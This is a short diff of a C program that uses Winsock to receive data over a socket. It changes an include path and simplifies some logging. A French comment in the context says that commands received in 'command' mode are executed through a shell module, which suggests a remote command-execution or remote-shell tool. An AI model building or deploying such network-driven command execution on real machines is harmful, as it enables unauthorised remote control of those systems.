@@ -2,7 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include "shell.c"
+#include "./modules/shell/shell.c"
 
 #include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
@@ -34,10 +34,7 @@ int main()
 		if(n<0){
 		 puts("failed to received data");
 		}
-		//buffer[n] = '\0';
-
-		puts("command received : ");
-		printf("buffer is : %s \n", buffer);
+		printf("command received (stored in buffer) is : %s \n", buffer);
 		//Si mode commande, execution de la commande via le script shell.c
 		if(strcmp(mode,"command") == 0){
 			printf("appel de la fonction shell\n");
